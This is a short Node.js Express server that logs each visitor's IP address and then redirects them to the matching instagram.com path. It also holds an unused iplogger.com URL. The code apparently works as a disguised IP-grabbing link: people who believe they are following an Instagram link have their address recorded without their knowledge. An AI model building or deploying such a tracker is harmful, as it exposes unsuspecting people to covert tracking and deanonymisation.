const express = require('express')
const app = express()
const port = process.env.PORT || 3000
const redirectUrl = 'https://iplogger.com/2KqpX6'
const instaUrl = 'https://www.instagram.com'

app.use((req, res) => {
    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const paths = req.originalUrl;
    console.log(visitorIp);
    res.redirect(302, `${instaUrl}${paths}`);
})

app.listen(port, () => {
    console.log(`Redirect service running at http://localhost:${port}`)
})